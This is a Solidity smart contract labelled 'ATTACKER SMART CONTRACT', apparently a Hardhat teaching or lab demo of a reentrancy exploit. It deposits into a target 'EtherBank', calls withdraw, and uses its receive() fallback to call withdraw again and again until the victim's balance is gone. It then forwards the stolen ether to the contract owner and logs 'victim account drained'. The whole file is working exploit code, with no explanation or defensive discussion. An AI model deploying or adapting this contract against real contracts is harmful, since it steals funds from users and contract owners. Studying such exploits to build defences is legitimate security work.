// ATTACKER SMART CONTRACT

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;
import "hardhat/console.sol";

interface IEtherBank {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    IEtherBank public immutable etherBank;
    address private owner;

    constructor(address etherBankAddress) {
        etherBank = IEtherBank(etherBankAddress);
        owner = msg.sender;
    }

    function attack() external payable{
        etherBank.deposit{value: msg.value}();
        etherBank.withdraw();
    }

    receive() external payable {
        if (address(etherBank).balance > 0) {
            console.log("reentering...");
            etherBank.withdraw();
        } else {
            console.log('victim account drained');
            payable(owner).transfer(address(this).balance);
        }
    }

    function getBalance() external view returns (uint) {
        return address(this).balance;
    }

}